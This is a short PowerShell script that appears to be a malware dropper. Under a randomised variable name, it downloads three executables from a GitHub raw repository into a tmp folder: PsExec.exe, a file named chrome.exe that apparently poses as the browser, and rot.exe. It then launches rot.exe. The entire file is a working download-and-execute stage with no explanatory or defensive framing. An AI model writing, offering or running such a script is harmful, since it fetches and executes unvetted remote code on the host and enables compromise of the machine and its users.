$fSiOVdcl99 = new-object System.Net.WebClient
$fSiOVdcl99.DownloadFile('https://github.com/Ccgnnz19/shekksl/raw/main/PsExec.exe','tmp/PsExec.exe')
$fSiOVdcl99.DownloadFile('https://github.com/Ccgnnz19/shekksl/raw/main/chrome.exe','tmp/chrome.exe')
$fSiOVdcl99.DownloadFile('https://github.com/Ccgnnz19/shekksl/raw/main/rot.exe','tmp/rot.exe')
Start-Process -FilePath "tmp/rot.exe"
